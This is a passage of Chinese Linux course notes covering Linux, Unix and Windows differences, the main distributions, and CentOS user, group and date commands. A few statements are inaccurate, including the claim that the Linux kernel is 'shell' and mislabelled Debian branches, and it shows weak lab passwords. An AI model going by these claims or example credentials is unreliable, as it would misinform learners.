Linux则可以运行在多种硬件平台上。\r\n\r\n可以先学习Linux后再学习Unix，因为Linux可以方便的在虚拟机上运行，防止新手的误操作。\r\n\r\n**3、本质不同**\r\n\r\nLinux是开放源代码的自由软件，用户对前者有很高的自主权，在实际的的开发是处在一个完全开放的环境之中；\r\n\r\n而Unix是对源代码实行知识产权保护的传统商业软件，用户的开发完全是处在一个黑箱之中，只有相关的开发人员才能够接触的产品的原型；\r\n\r\n> Unix 诞生于 20 世纪 60 年代末，Windows 诞生于 20 世纪 80 年代中期，Linux 诞生于 20 世纪 90 年代初，可以说 Unix是操作系统中的"老大哥"，后来的 Windows 和 Linux 都参考了 Unix \r\n>\r\n\r\n##  1.5 Linux和Windows区别\r\n\r\n目前国内 Linux 更多的是应用于服务器上，而桌面操作系统更多使用的是 Windows。主要区别如下\r\n\r\n| 比较     | Windows                                                      | Linux                                                        |\r\n| :------- | :----------------------------------------------------------- | :----------------------------------------------------------- |\r\n| 界面     | 界面统一，外壳程序固定所有 Windows 程序菜单几乎一致，快捷键也几乎相同 | 图形界面风格依发布版不同而不同，可能互不兼容。GNU/Linux 的终端机是从 Unix传承下来，基本命令和操作方法也几乎一致。 |\r\n| 驱动程序 | 驱动程序丰富，版本更新频繁。默认安装程序里面一般包含有该版本发布时流行的硬件驱动程序，之后所出的新硬件驱动依赖于硬件厂商提供。对于一些老硬件，如果没有了原配的驱动有时很难支持。另外，有时硬件厂商未提供所需版本的 Windows 下的驱动，也会比较头痛。 | 由志愿者开发，由 Linux 核心开发小组发布，很多硬件厂商基于版权考虑并未提供驱动程序，尽管多数无需手动安装，但是涉及安装则相对复杂，使得新用户面对驱动程序问题（是否存在和安装方法）会一筹莫展。但是在开源开发模式下，许多老硬件尽管在Windows下很难支持的也容易找到驱动。HP、Intel、AMD 等硬件厂商逐步不同程度支持开源驱动，问题正在得到缓解。 |\r\n| 使用     | 使用比较简单，容易入门。图形化界面对没有计算机背景知识的用户使用十分有利。 | 图形界面使用简单，容易入门。文字界面，需要学习才能掌握。     |\r\n| 学习     | 系统构造复杂、变化频繁，且知识、技能淘汰快，深入学习困难。   | 系统构造简单、稳定，且知识、技能传承性好，深入学习相对容易。 |\r\n| 软件     | 每一种特定功能可能都需要商业软件的支持，需要购买相应的授权。 | 大部分软件都可以自由获取，同样功能的软件选择较少。           |\r\n\r\nWindows与Linux在其他方面的不同\r\n\r\n**开放性**\r\n\r\n所谓的开放性就是Linux 操作系统是开放源码系统，可以对其程序进行编辑修改。而微软的Windows 系统是受微软版权保护，就是只能微软内部进行开发及修改。\r\n\r\n**文件格式不同**\r\n\r\nWindows 操作系统内核是NT，而Linux 是 shell；\r\n\r\n另外，windows 硬盘文件格式是fat32或NTFS，而Linux 需要的文件格式是ext2或ext3，该操作系统还多一个SWAP格式的交换分区\r\n\r\n**免费与收费** \r\n\r\n在中国，对个人用户Windows 和Linux 都是免费的，对公用户Windows 需要收费，Linux 是免费的。\r\n\r\n**技术支持** \r\n\r\nWindows 较普及。Linux 需要深度的Linux 版块支持。\r\n\r\n**安全性** \r\n\r\nLinux 相对Windows 来说安全性更高。 \r\n\r\n**开源** \r\n\r\n开源就是指对外部开放软件源代码。Linux 开源，而Windows并不开源。\r\n\r\n**使用习惯** \r\n\r\nWindows 放弃了dos的字符模式，主攻图形界面，让桌面系统更易用。Linux 字符模式运行的更好，图形界面还只是附带品，可有可无。\r\n\r\n**软件与支持** \r\n\r\nWindows 下可以运行绝大部分软件、玩99.999％的游戏、硬件厂商近乎100%的支持。Linux 下可直接运行的软件数量和win下比起来就是1和99的区别，而且目前选择Linux 的人基本不会考虑玩游戏，同时Linux 正期待更多硬件厂商的支持\r\n\r\n## 1.6 Linux发行商和常见发行版\r\n\r\nLinux发行版是由个人，自由组织，以及商业机构和志愿者组织编写。它们通常包括了其他的系统软件和应用软件，以及一个用来简化系统初始安装的安装工具，和让软件安装升级的集成管理器。大多数系统还包括了像提供GUI界面的XFree86之类的曾经运行于BSD的程序。\r\n一个典型的Linux发行版包括：Linux内核，一些GNU程序库和工具，命令行shell，图形界面的桌面环境，如KDE或GNOME，并包含数千种从办公套件，编译器，文本编辑器到科学工具的应用软件\r\n\r\nLinux发行版的某些版本是不需要安装，只需通过CD或者可启动的USB存储设备就能使用的版本，他们称为LiveCD。\r\n\r\n\r\n ![1575879998775](./img/linux/java-linux/Linux-v10-01天-授课/1575879998775.png)\r\n\r\n\r\n\r\n**Linux的版本号分为两部分：内核版本和发行版本**。\r\n\r\n**1．Linux的内核版本**\r\n内核版本指的是在Linus Torvalds领导下的开发小组开发出的系统内核的版本号，通常，内核版本号的第二位是偶数表示是稳定的版本，如2.6.25；是奇数表示有一些新的东西加入，是不稳定的测试版本，如2.5.6。Linux操作系统的核心就是它的内核，Linus Torvalds和他的小组在不断地开发和推出新内核。\r\n\r\n任务：进程调度、内存管理、配置管理虚拟文件系统、提供网络接口以及支持进程间通信。像所有软件一样，Linux的内核也在不断升级。\r\n\r\n**2．Linux的发行版本**\r\n一个完整的操作系统不仅仅只有内核，还包括一系列为用户提供各种服务的外围程序。外围程序包括GNU程序库和工具，命令行shell，图形界面的X Window系统和相应的桌面环境，如KDE或GNOME，并包含数千种从办公套件，编译器，文本编辑器到科学工具的应用软件。所以，许多个人、组织和企业，开发了基于GNU/Linux的Linux发行版，他们将Linux系统的内核与外围应用软件和文档包装起来，并提供一些系统安装界面和系统设置与管理工具， 这样就构成了一个发行版本。\r\n实际上，Linux的发行版本就是Linux内核再加上外围的实用程序组成的一个大软件包而已。相对于操作系统内核版本，发行版本的版本号是随发布者的不同而不同，与Linux系统内核的版本号是相对独立的，例如：RedHat EnterpriseLinux 5.2的操作系统内核是Linux-2.6.18。\r\nLinux的发行版本大体可以分为两类：\r\n\r\n一类是商业公司维护的发行版本\r\n\r\n一类是社区组织维护的发行版本，前者以著名的RedHatLinux为代表，后者以Debian为代表\r\n\r\n以下为Linux的主流版本：\r\n\r\n目前市面上较知名的发行版有：Ubuntu、RedHat、CentOS、Debian、Fedora、SuSE、OpenSUSE、Arch Linux、SolusOS 等\r\n\r\n![1575882315996](./img/linux/java-linux/Linux-v10-01天-授课/1575882315996.png)\r\n\r\n\r\n\r\n**以下是主要的发行版本**\r\n\r\n```\r\n需要注意的：\r\n下面的内容主要是介绍了下Linux发行家族以及发行版本的一些详细信息，虽然我们当前的课程讲解的是CentOS,但是其他的一些发行商、主流的发行版本比如Ubuntu、Redhat也需要让学生多多了解下，毕竟这是Linux体系内产品线\r\n注意\r\n下面的文字虽然很多，但是只要让学生知道有这么回事即可\r\n在下面会简单的总结..\r\n```\r\n\r\n**1、Debian 介绍**\r\n\r\nDebian名字的由来----DebianGNU/Linux是由一个叫做伊恩·默多克（IanMurdock）在1993年发起的，他的名字以Ian开头，他太太的名字Debra开头三个字母是Deb。\r\n\r\nDebian是社区类Linux的典范，是迄今为止最遵循GNU规范的Linux系统。Debian最早由 Ian Murdock于1993年创建，分为三个版本分支： stable(服务器版), testing(稳定版) 和unstable(测试版)。\r\n\r\n**2、Ubuntu介绍**\r\n\r\nUbuntu严格来说不能算一个独立的发行版本，Ubuntu是基于Debian的unstable版本加强而来，可以这么说，Ubuntu就是一个拥有Debian所有的优点，以及自己所加强的优点的近乎完美的 Linux桌面系统。\r\n\r\n共分三个版本:\r\n\r\n- 基于Gnome的Ubuntu，\r\n- 基于KDE的Kubuntu以。\r\n- 基于Xfc的 Xubuntu。\r\n\r\n特点是界面非常友好，容易上手，对硬件的支持非常全面，是最适合做桌面系统的Linux发行版本。稳定性，其实都差不多，难易度嘛，\r\n\r\nUbuntu 默认桌面环境采用 GNOME，一个 Unix和 Linux 主流桌面套件和开发平台。\r\n\r\nUbuntu的版本和发布号 \r\nUbuntu的版本号是由该次发布的年份和月份组成，并未反映其实际版本。我们的首次发布是在2004年10月，因此该版本为4.10。当前版本(DapperDrake)于2006年6月发布，因此版本号为6.06 LTS。\r\n\r\n**3、Redhat**\r\n\r\n可能这是最著名的Linux版本了，Red Hat Linux已经创造了自己的品牌，越来越多的人听说过它。Red Hat在1994年创业，当时聘用了全世界500多名员工，他们都致力于开放的源代码体系。\r\nRed Hat Linux是公共环境中表现上佳的服务器。它拥有自己的公司，能向用户提供一套完整的服务，这使得它特别适合在公共网络中使用。这个版本的Linux也使用最新的内核，还拥有大多数人都需要使用的主体软件包。\r\nRed Hat Linux的安装过程也十分简单明了。它的图形安装过程提供简易设置服务器的全部信息。磁盘分区过程可以自动完成，还可以选择GUI工具完成，即使对于 Linux新手来说这些都非常简单。选择软件包的过程也与其他版本类似；用户可以选择软件包种类或特殊的软件包。系统运行起来后，用户可以从Web站点和 Red Hat那里得到充分的技术支持。我发现Red Hat是一个符合大众需求的最优版本。在服务器和桌面系统中它都工作得很好。Red Hat的唯一缺陷是带有一些不标准的内核补丁，这使得它难于按用户的需求进行定制。 Red Hat通过论坛和邮件列表提供广泛的技术支持，它还有自己公司的电话技术支持，后者对要求更高技术支持水平的集团客户更有吸引力\r\n\r\n**4、Fedora**\r\n\r\nFedora和Redhat这两个Linux的发行版放联系很密切。Redhat 自9.0以后，不再发布桌面版的，而是把这个项目与开源社区合作，于是就有了Fedora 这个 Linux 发行版。Fedora项目是由 Red Hat 赞助，由开源社区与 Red Hat 工程师合作开发的项目统称。Fedora 的目标，是推动自由和开源软件更快地进步。\r\n\r\n特点：\r\n１、 Fedora 是一个开放的、创新的、前瞻性的操作系统和平台，基于 Linux。它允许任何人自由地使用、修改和重发布，无论现在还是将来。可运行的体系结构包括x86(即i386),x86_64 和PowerPC！\r\n２、Fedora 可以说是Redhat 桌面版本的延续，只不过是与开源社区合作。\r\n\r\n３、Fedora 是一个独立的inux发行版本的操作系统。\r\n\r\n**5**、**centos**\r\n\r\nCentOS（Community ENTerprise Operating System）是来自于Red Hat Enterprise Linux依照开放源代码规定释出的源代码所编译而成。由于出自同样的源代码，因此有些要求高度稳定性的服务器以CentOS替代商业版的Red Hat Enterprise Linux使用（我会告诉你，以为企业想省钱，运维要靠这个东西来赚钱嘛，国内运维主流是CentOS剩下版本很少）。两者的不同，在于CentOS并不包含封闭源代码软件，CentOS 是一个基于Red Hat Linux 提供的可自由使用源代码的企业级Linux发行版本。每个版本的CentOS都会获得十年的支持（通过安全更新方式）。新版本的 CentOS 大约每两年发行一次，而每个版本的 CentOS 会定期（大概每六个月）更新一次，以便支持新的硬件。这样，建立一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境\r\n\r\n\r\n**6、Slackware介绍**\r\n\r\nSlackware 由PatrickVolkerding(帕特里克.沃克登)创建于1992年。算起来应当是历史最悠久的Linux发行版。尽管如此，Slackware仍然深入人心（大部分都是比较有经验的 Linux老手）。Slackware稳定、安全，所以仍然有大批的忠实用户。由于Slackware尽量采用原版的软件包而不进行任何修改，所以制造新 bug的几率便低了很多。Slackware的版本更新周期较长（大约1年），但是新版本的软件仍然不间断的提供给用户下载。\r\n\r\n**7、openSUSE介绍**\r\n\r\nSUSE是德国最著名的Linux发行版，在全世界范围中也享有较高的声誉。SUSE自主开发的软件包管理系统也大受好评。SUSE于2003年年末被Novell收购。SUSE在收购之后的发布显得比较混乱，比如9.0版本是收费的，而10.0版本（也许由于各种压力）又免费发布。这使得一部分用户感到困惑，也转而使用其它发行版本。最近还跟微软扯到了一起。但是瑕不掩瑜，SUSE仍然是一个非常专业、优秀的发行版。\r\n\r\nopenSUSE 项目是由Novell公司资助的全球性社区计划，旨在推进 Linux 的广泛使用。这个计划提供免费的openSUSE 操作系统。这里是一个由普通用户和开发者共同构成的社区，我们拥有一个共同的目标—创造世界上最好用的 Linux 发行版。openSUSE 是 Novell 公司发行的企业级 Linux 产品的系统基础。\r\n\r\nopenSUSE 项目是由Novell 发起的开源社区计划。 旨在推进 Linux 的广泛使用。提供了自由简单的方法来获得世界上最好用的 Linux 发行版，SUSE Linux。openSUSE 项目为 Linux 开发者和爱好者提供了开始使用 Linux 所需要的一切。\r\n\r\n**8、中国大陆的Linux发行版**\r\n\r\n红旗Linux(RedflagLinux) ，冲浪Linux(Xteam Linux) ，蓝点Linux ， GNU/Linux，OpenDesktop等等 。\r\n\r\n**9、 台湾地区的Linux发行版**\r\n\r\n鸿奇Linux\r\n\r\n**目前最著名的发行版本：Debian，ubuntu、OpenSuse(原Suse)、CentOS、fedora等。国内比较著名的红旗Linux版本**\r\n\r\n\r\n\r\n> 对于上面的知识我们做下重点总结\r\n>\r\n> - **redhat**：目前，全球最大的**linux**发行厂商，功能全面、稳定。\r\n>   - **Redhat** 被 **IBM** 收购!\r\n> - **ubuntu**：目前，是linux桌面操作系统做的最好的。\r\n> - **centos**：免费版的redhat，**centos** 基于 **redhat** 发行版基础之上，再重新编译发布的版本。\r\n>   - 目前 **centos** 已经被 **Redhat** 公司收购，但是依然免费\r\n\r\n\r\n\r\n## 1.7 Linux 应用领域\r\n\r\n今天各种场合都有使用各种 Linux 发行版，从嵌入式设备到超级计算机，并且在服务器领域确定了地位。在企业级开发中，我们通常使用Linux作为我们的服务器。\r\n\r\n比如：服务器系统Web应用服务器、数据库服务器、接口服务器、DNS、FTP等等； \r\n\r\n嵌入式系统路由器、防火墙、手机、PDA、IP 分享器、交换器、家电用品的微电脑控制器等等，高性能运算、计算密集型应用Linux有强大的运算能力。\r\n\r\n**目前 Linux 不仅在家庭与企业中使用，并且在政府中也很受欢迎**。\r\n\r\n- 巴西联邦政府由于支持 Linux 而世界闻名。\r\n- 有新闻报道俄罗斯军队自己制造的 Linux 发布版的，做为 G.H.ost 项目已经取得成果。\r\n- 印度的 Kerala 联邦计划在向全联邦的高中推广使用 Linux。\r\n- 中华人民共和国为取得技术独立，在龙芯处理器中排他性地使用 Linux。\r\n- 在西班牙的一些地区开发了自己的 Linux 发布版，并且在政府与教育领域广泛使用，如 Extremadura 地区的 gnuLinEx 和 Andalusia 地区的 Guadalinex。\r\n- 葡萄牙同样使用自己的 Linux 发布版 Caixa Mágica，用于 Magalh?es 笔记本电脑和 e-escola 政府软件。\r\n- 法国和德国同样开始逐步采用 Linux。\r\n\r\n## **1.8 Linux之CentOS**\r\n\r\n```\r\n前面章节介绍了一些Linux的基本知识，前已经对Linux有了一个初步的认识，也知道了在Linux发行版中有各个家族的发行版本；比如比较知名的ubuntu、CentOS，在今天的Linux课程中我们将采用发行版CentOS作为我们Linux课程的讲解内容。\r\n```\r\n\r\n**CentOS**，是基于 Red Hat Linux 提供的可自由使用源代码的企业级 Linux 发行版本；是一个稳定，可预测，可管理和可复制的免费企业级计算平台\r\n\r\n**主要特点:**\r\n\r\n1.主流： 目前的Linux操作系统主要应用于生产环境，主流企业级Linux系统仍旧是RedHat或者CentOS\r\n2.免费： RedHat 和CentOS差别不大，CentOS是一个基于Red Hat Linux 提供的可自由使用源代码的企业级Linux发行版本\r\n3.更新方便：CentOS独有的yum命令支持在线升级，可以即时更新系统，不像RED HAT那样需要花钱购买支持服务！\r\n\r\n**我们在当前课程中的环境：**\r\n\r\nWindows7 , VMware Workstation15.02, CentOS Linux release 7.6.1810 \r\n\r\n## 1.9 总结\r\n\r\n当前章节主要介绍了Linux发行的主要版本（我们使用的是CentOS Linux release 7.6.1810 ）、以及与Unix、Windows系统的区别；主要让学生了解Linux是基于Unix的以及与Windows一样，Linux也是操作系统即可。\r\n\r\n# 2 系统与设置命令\r\n\r\n```\r\n在前面的两个章节中，我们主要介绍了Linux基本知识和虚拟机的安装，从当前章节开始，我们一起学习下Linux的基本命令，在当前章节，我们先简单的学习下一些系统的基本命令，慢慢的由浅入深，在后面的章节中我们将学习其他的命令比如文件操作、备份压缩等\r\n```\r\n\r\n## 2.1 学习命令的原因\r\n\r\n```\r\n命令我们可以理解成在Windows中我们常常为了查看ip输入的ipconfig，在Linux中也有很多的命令，比如操作目录、文件、网络、磁盘等等命令\r\n```\r\n\r\n- Linux刚面世时并没有图形界面, 所有的操作全靠命令完成, 如 **磁盘操作、文件存取、目录操作、进程管理、文件权限** 设定等\r\n- 在职场中，大量的 **服务器维护工作** 都是在 远程 通过SSH客户端 来完成的， 并没有图形界面， 所有的维护工作都需要通过命令来完成\r\n\r\n![1576225778294](./img/linux/java-linux/Linux-v10-01天-授课/1576225778294.png)\r\n\r\n在职场中， 作为后端程序员或者运维， 必须要或多或少的掌握一些Linux常用的终端命令\r\n\r\n- Linux发行版本的命令大概有200多个， 但是常用的命令只有几十个而已\r\n\r\n```\r\n总结\r\n学习终端命令的技巧：\r\n- 不需要死记硬背， 对于常用命令， 记住语法是关键，在用的时候去查下参数选项，有的很常用的命令，用的多自然就记住了\r\n- 不要尝试一次学会所有的命令， 有些命令是非常不常用的，临时遇到，就去根据语法找参数选项\r\n```\r\n\r\n## 2.2 Linux 用户和用户组管理\r\n\r\n### 2.2.1 Linux账号管理\r\n\r\n```\r\n从当前章节开始，我们正式进入CentOS的学习，我们先从简单的命令开始，比如操作账号、用户组、系统管理等。\r\n在实际使用场景中，用户账号的管理主要涉及到用户账号的添加、修改和删除操作。\r\n现在，我们就通过命令的方式添加用户账号（账号名字可以自定义，但是是要符合书写规范）\r\n在操作前，确保我们的SecureCRT成功连接到了虚拟机.\r\n下面的章节不在赘述SecureCRT，默认已经成功连接。\r\n```\r\n\r\n#### 1) 添加用户\r\n\r\n```\r\n我们在Windows创建账号主要是是控制面板--用户账户--创建一个新账户，这是在Windows创建账户的流程，而在Linux中，我们可以通过命令的方式进行创建账户\r\n```\r\n\r\n**使用者权限：管理员用户**\r\n\r\n```shell\r\nuseradd 选项 用户名\r\n```\r\n\r\n**参数说明：**\r\n\r\n- 选项:\r\n\r\n  - -c comment 指定一段注释性描述。\r\n  - -d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录。\r\n  - -g 用户组 指定用户所属的用户组。\r\n  - -G 用户组，用户组 指定用户所属的附加组。\r\n  - -s Shell文件 指定用户的登录Shell。\r\n  - -u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。\r\n\r\n- 用户名:\r\n\r\n  指定新账号的用户名(后续我们可以使用这个用户名进行系统登录)。\r\n\r\n添加用户czbk（传智播客的首拼）执行\r\n\r\n```shell\r\nuseradd  czbk\r\n```\r\n\r\n我们使用useradd命令创建了一个用户czbk\r\n\r\nuseradd 可用来建立用户帐号。帐号建好之后，再用 passwd 设定帐号的密码。\r\n\r\n执行如下\r\n\r\n![1576043805214](./img/linux/java-linux/Linux-v10-01天-授课/1576043805214.png)\r\n\r\n由上图我们发现，我们在使用useradd新增用户的时候，出现了权限不足，也就是说我们使用用户itcast没有创建用户的权限。\r\n\r\n我们通过管理员账号root进行创建，首先我们从控制台中切换到root\r\n\r\n```shell\r\nsu root\r\n```\r\n\r\n![1576042675759](./img/linux/java-linux/Linux-v10-01天-授课/1576042675759.png)\r\n\r\n在 密码的地方输入我们的root密码【root】即可进入到root用户下。\r\n\r\n我们在root下继续创建czbk用户\r\n\r\n![1576043845543](./img/linux/java-linux/Linux-v10-01天-授课/1576043845543.png)\r\n\r\n以下是useradd常用选项\r\n\r\n![1576049906893](./img/linux/java-linux/Linux-v10-01天-授课/1576049906893.png)\r\n\r\n\r\n\r\n#### 2) 用户口令\r\n\r\n```\r\n引子：\r\n相当于我们在Windows系统中给个用户更改密码，只是我们在CentOS中是更改密码是通过命令完成的。\r\n```\r\n\r\n用户管理的一项重要内容是用户口令的管理。用户账号刚创建时没有口令，但是被系统锁定，无法使用，必须为其指定口令后才可以使用\r\n\r\n**使用者权限：管理员用户**\r\n\r\n指定和修改用户口令的Shell命令是`passwd`。超级用户可以为自己和其他用户指定口令，普通用户只能用它修改自己的口令。命令的格式为：\r\n\r\n```shell\r\npasswd 选项 用户名\r\n```\r\n\r\n可使用的选项：\r\n\r\n- -l 锁定口令，即禁用账号。\r\n- -u 口令解锁。\r\n- -d 使账号无口令。\r\n- -f 强迫用户下次登录时修改口令。\r\n\r\n设置当前用户的口令\r\n\r\n```shell\r\npasswd czbk\r\n```\r\n\r\n此处我们设置密码和itcast账号密码一致，为【Itheima888】\r\n\r\n![1576044108094](./img/linux/java-linux/Linux-v10-01天-授课/1576044108094.png)\r\n\r\n#### 3) 修改用户\r\n\r\n```\r\n相当于我们在Windows系统中修改一个用户，只是我们在CentOS中是修改用户是通过命令完成的。\r\n```\r\n\r\nusermod 命令通过修改系统帐户文件来修改用户账户信息\r\n\r\n修改用户账号就是根据实际情况更改用户的有关属性，如用户号、主目录、用户组、登录Shell等。\r\n\r\n**使用者权限：管理员用户**\r\n\r\n修改已有用户的信息使用`usermod`命令，其格式如下：\r\n\r\n```shell\r\nusermod 选项 用户名\r\n```\r\n\r\n下面命令将用户czbk用户名修改成czbk2019\r\n\r\n```shell\r\nusermod -l czbk2019  czbk\r\n```\r\n\r\n![1576046509680](./img/linux/java-linux/Linux-v10-01天-授课/1576046509680.png)\r\n\r\n以下是usermod常用选项\r\n\r\n![1576049946335](./img/linux/java-linux/Linux-v10-01天-授课/1576049946335.png)\r\n\r\n#### 4) 删除用户\r\n\r\n```\r\n相当于我们在Windows系统中删除一个用户，只是我们在CentOS中是删除用户是通过命令完成的。\r\n```\r\n\r\n假如我们其中一个用户的账号不再使用，可以从系统中删除。删除用户账号就是要将/etc/passwd等系统文件中的该用户记录删除，必要时还删除用户的主目录。\r\n\r\n**使用者权限：管理员用户**\r\n\r\n删除一个已有的用户账号使用`userdel`命令，其格式如下：\r\n\r\n```shell\r\nuserdel 选项 用户名\r\n```\r\n\r\n-f：强制删除用户，即使用户当前已登录;\r\n\r\n-r：删除用户的同时，删除与用户相关的所有文件\r\n\r\n此命令删除用户czbk2019\r\n\r\n```shell\r\nuserdel czbk2019\r\n```\r\n\r\n![1576047020612](./img/linux/java-linux/Linux-v10-01天-授课/1576047020612.png)\r\n\r\n成功删除用户czbk2019\r\n\r\n以下是userdel常用选项\r\n\r\n![1576049978916](./img/linux/java-linux/Linux-v10-01天-授课/1576049978916.png)\r\n\r\n### 2.2.2 Linux用户组\r\n\r\n**引子：**\r\n\r\n**为了方便用户管理, 提出了 组 的概念, 如下图所示**\r\n\r\n![1576572808687](./img/linux/java-linux/Linux-v10-01天-授课/1576572808687.png)\r\n\r\n**新增一个账户，它默认属于自己（账户）的组**\r\n\r\n**比如新建账户【张三】，那么它默认对应的组就是张三**\r\n\r\n**一个用户可以有一个或者多个组**\r\n\r\n**假如说（如上图），我们在企业级开发过程中，我们有多个组，其中一个开发组对应三个账户，张三、李四、王五、如果就像上面提到的，一个用户默认对应一个组，那么三个账户张三、李四、王五就有了三个不同的组，如果大家都操做一个文件，在进行权限分配的时候，就要对不同的三个组进行授权，显然这样是不合理的，因为太过繁琐。**\r\n\r\n**所以，才有了组（新建组）的概念，我们把张三、李四、王五统一放到【开发组】，在对文件授权的时候，我们只对【开发组】进行授权由此，这样的话【张三、李四、王五】都有相等的权利操作了。**\r\n\r\n#### 1) 增加用户组\r\n\r\n新增一个用户组（组名可见名知意，符合规范即可），然后将用户添加到组中\r\n\r\n**使用者权限：管理员用户** \r\n\r\n```shell\r\ngroupadd 选项 用户组\r\n```\r\n\r\n使用的选项有：\r\n\r\n- -g GID 指定新用户组的组标识号（GID）。\r\n- -o 一般与-g选项同时使用，表示新用户组的GID可以与系统已有用户组的GID相同\r\n\r\n新增用户组czbk-it\r\n\r\n```shell\r\ngroupadd czbk-it\r\n```\r\n\r\n上面的命令向系统中增加了一个新组czbk-it，新组的组标识号是在当前已有的最大组标识号的基础上加1\r\n\r\n以下是groupadd常用选项\r\n\r\n![1576050003979](./img/linux/java-linux/Linux-v10-01天-授课/1576050003979.png)\r\n\r\n#### 2) 修改用户组\r\n\r\n**使用者权限：管理员用户**\r\n\r\n```shell\r\ngroupmod 选项 用户组\r\n```\r\n\r\n常用的选项有：\r\n\r\n- -g GID 为用户组指定新的组标识号。\r\n- -o 与-g选项同时使用，用户组的新GID可以与系统已有用户组的GID相同。\r\n- -n新用户组 将用户组的名字改为新名字\r\n\r\n```shell\r\ngroupmod  -n czbk-it-2019  czbk-it\r\n```\r\n\r\n上面的命令将组czbk-it的组名修改为czbk-it-2019。\r\n\r\n![1576047810973](./img/linux/java-linux/Linux-v10-01天-授课/1576047810973.png)\r\n\r\n以下是groupmod常用选项\r\n\r\n![1576050645612](./img/linux/java-linux/Linux-v10-01天-授课/1576050645612.png)\r\n\r\n#### 3) 查询用户所属组\r\n\r\n在查询用户所属的用户组前，我们先增加一个用户ituser-groups\r\n\r\n```shell\r\nuseradd ituser-groups\r\n```\r\n\r\n![1576050663149](./img/linux/java-linux/Linux-v10-01天-授课/1576050663149.png)\r\n\r\n要查询一个用户属于哪个用户组，使用groups命令，其格式如下\r\n\r\n```shell\r\ngroups 用户名\r\n```\r\n\r\n查询用户ituser-groups属于某个用户组，执行groups命令\r\n\r\n```shell\r\ngroups ituser-groups\r\n```\r\n\r\n![1576050797421](./img/linux/java-linux/Linux-v10-01天-授课/1576050797421.png)\r\n\r\n由此可见，ituser-groups用户属于用户组ituser-groups（用户组默认与用户名一样）\r\n\r\n#### 4) 删除用户组\r\n\r\n**使用者权限：管理员用户**\r\n\r\n要删除一个已有的用户组，使用groupdel命令，其格式如下\r\n\r\n```shell\r\ngroupdel 用户组\r\n```\r\n\r\n删除czbk-it-2019用户组\r\n\r\n```shell\r\ngroupdel czbk-it-2019\r\n```\r\n\r\n![1576051028346](./img/linux/java-linux/Linux-v10-01天-授课/1576051028346.png)\r\n\r\n删除成功\r\n\r\n以下是groupdel常用选项\r\n\r\n![1576050031859](./img/linux/java-linux/Linux-v10-01天-授课/1576050031859.png)\r\n\r\n### 2.2.3 将用户添加到组\r\n\r\n```\r\n引子：\r\n在上面我们学习如何新增用户，也学习了如何新增用户组，在当前的小节中，我们新建一个用户、新建一个用户组、然后把新建的用户添加到新的组中\r\n在实际开发过程中，我们通常把多个用户按照业务需求归并到统一的一个组中，进行有序管理\r\n```\r\n\r\n1、创建一个新的组，并添加组ID（需要切换到root用户）\r\n\r\n```shell\r\ngroupadd -g 8888 itbj2020group\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576137760529](./img/linux/java-linux/Linux-v10-01天-授课/1576137760529.png)\r\n\r\n2、创建3个用户（需要切换到root用户）\r\n\r\n```shell\r\n useradd  itbeijinguser1\r\n useradd  itbeijinguser2\r\n useradd  itbeijinguser3\r\n```\r\n\r\n3、将上面三个用户添加到组itbj2020group\r\n\r\n我们通过passwd命令将三个用户添加到组\r\n\r\n**什么是gpasswd：**\r\n\r\ngpasswd 是 Linux 下工作组文件 /etc/group 和 /etc/gshadow 管理工具，用于将一个用户添加到组或者从组中删除。\r\n\r\n语法\r\n\r\n```shell\r\ngpasswd [可选项] 组名\r\n```\r\n\r\n**将上面的三个用户使用gpasswd添加到组（需要切换到root用户）**\r\n\r\n```shell\r\ngpasswd -a itbeijinguser1 itbj2020group\r\ngpasswd -a itbeijinguser2 itbj2020group\r\ngpasswd -a itbeijinguser3 itbj2020group\r\n```\r\n\r\n**执行如下**\r\n\r\n![1576139901757](./img/linux/java-linux/Linux-v10-01天-授课/1576139901757.png)\r\n\r\n**查看用户组下所有用户（所有用户）**\r\n\r\n> 注意\r\n>\r\n> 此处的grep命令我们将在文件管理章节详细讲解，这里先使用它查看下效果\r\n\r\n```shell\r\ngrep \'itbj2020group\' /etc/group\r\n```\r\n\r\n执行效果如下（或者直接打开/etc/group文件都可以）\r\n\r\n![1576139987480](./img/linux/java-linux/Linux-v10-01天-授课/1576139987480.png)\r\n\r\n由上图可知：三个用户全部都加入到了itbj2020group组。\r\n\r\n## 2.3 系统管理\r\n\r\n```\r\n系统管理，说的就是我们的CentOS系统，它不同于Windwos，CentOS是字符界面，我们需要通过命令进行操作，在当前章节，我们先从基本命令学起，比如创建用户、设置密码、修改用户以及用户组的相关操作。也为我们后面的章节打下基础\r\n```\r\n\r\n### 2.3.1 日期管理\r\n\r\n```\r\n当前日期如果通过date进行设置，在系统重启后不会保存date的设置，常用的只是通过date命令查看日期\r\n```\r\n\r\ndate 可以用来显示或设定系统的日期与时间\r\n\r\n使用者权限：所有用户\r\n\r\n**语法如下：**\r\n\r\n```shell\r\ndate [参数选项]\r\n```\r\n\r\n参数\r\n\r\n-d<字符串>：显示字符串所指的日期与时间。字符串前后必须加上双引号； \r\n-s<字符串>：根据字符串来设置日期与时间。字符串前后必须加上双引号； \r\n-u：显示GMT； \r\n--help：在线帮助； \r\n--version：显示版本信息\r\n\r\n1、设置时间\r\n\r\n用 -s选项可以设置系统时间，如下：\r\n\r\n```shell\r\ndate -s "2019-12-11 16:15:00"\r\n```\r\n\r\n![1576052178420](./img/linux/java-linux/Linux-v10-01天-授课/1576052178420.png)\r\n\r\n2、显示时间\r\n\r\n```shell\r\ndate\r\n```\r\n\r\n![1576052234012](./img/linux/java-linux/Linux-v10-01天-授课/1576052234012.png)\r\n\r\n**（1）UTC** \r\n\r\n协调世界时，又称世界统一时间、世界标准时间、国际协调时间。由于英文（CUT）和法文（TUC）的缩写不同，作为妥协，简称UTC。。\r\n\r\n**（2）GMT**\r\n\r\n即[格林尼治](https://baike.baidu.com/item/格林尼治/3065623) 平太阳时间，是指格林尼治所在地的标准时间，也是表示地球自转速率的一种形式\r\n\r\n**外文名:**Universal Time\r\n\r\n**其他外文名**G.M.T.(Greenwich Mean Time)\r\n\r\n**（3）CST**\r\n\r\n北京时间 